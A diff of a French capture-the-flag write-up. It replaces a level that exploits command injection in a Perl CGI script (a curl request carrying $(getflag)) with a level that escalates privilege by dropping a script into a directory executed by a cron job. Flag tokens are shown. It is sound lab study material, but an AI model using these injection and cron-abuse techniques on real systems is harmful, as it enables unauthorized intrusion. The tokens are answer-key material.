@@ -1,41 +1,48 @@
 -----------------------------------------------------------
-                          LEVEL03
+                          LEVEL05
 -----------------------------------------------------------
 
-1. On affiche le contenu du fichier perl level04.pl
+1. On cherche les fichiers avec pour user flag05
    --------------------------------------------------------
-   CM : cat level04.pl
-   OUTPUT : #!/usr/bin/perl
-            # localhost:4747
-            use CGI qw{param};
-            print "Content-type: text/html\n\n";
-            sub x {
-            $y = $_[0];
-            print `echo $y 2>&1`;
-            x(param("x"));
+   CM : find / -user flag05 2>/dev/null
+   OUTPUT : /usr/sbin/openarenaserver
+            /rofs/usr/sbin/openarenaserver
 
-2. Le script perl permet d'afficher la valeur de premier
-   paramètre envoyé 
+2. On affiche le contenu, c'est un script bash non
+   executable
    --------------------------------------------------------
-   CM : curl 'localhost:4747?x=coucou'
-   OUTPUT : coucou
+   CM : cat /usr/sbin/openarenaserver
+   OUTPUT : #!/bin/sh
 
-3. On fetch le header pour vérifier qu'on travail bien avec
-   un server HTTP
-   --------------------------------------------------------
-   CM : curl -I localhost:4747
-   OUTPUT : HTTP/1.1 200 OK
-            Date: Mon, 06 Feb 2023 15:35:26 GMT
-            Server: Apache/2.2.22 (Ubuntu)
-            Vary: Accept-Encoding
-            Content-Length: 1
-            Content-Type: text/html
+            for i in /opt/openarenaserver/* ; do
+               (ulimit -t 5; bash -x "$i")
+               rm -f "$i"
+            done
 
-4. De fait, on peut envoyé un sous commande pour que le echo
-   du script affiche son contenu
+3. On cherche les fichiers avec pour name level05
    --------------------------------------------------------
-   CM : curl 'localhost:4747?x=$(getflag)
+   CM :  find / -name level05 2>/dev/null
+   OUTPUT : /var/mail/level05
+            /rofs/var/mail/level05
+
+4. On affiche le contenu, c'est une commande CRON qui
+   execute /usr/sbin/openarenaserver toutes les 2 mins
+   --------------------------------------------------------
+   CM :  cat /var/mail/level05
+   OUTPUT : */2 * * * * su -c "sh
+            /usr/sbin/openarenaserver" - flag05
+
+5. On creer un script dans le dossier /opt/openarenaserver 
+   qui se chargera d'executer getflag lorsque le CRON 
+   executera le script /usr/sbin/openarenaserver
+   --------------------------------------------------------
+   CM : echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag
+
+6. On attend 2-3 mins le temps que le script s'execute, et on 
+   cat le contenue de /tmp/flag 
+   --------------------------------------------------------
+   CM : cat /tmp/flag 
    OUTPUT : Check flag.
-            Here is your token : ne2searoevaevoem4ov4ar8ap
+            Here is your token : viuaaale9huek52boumoomioc
 
 
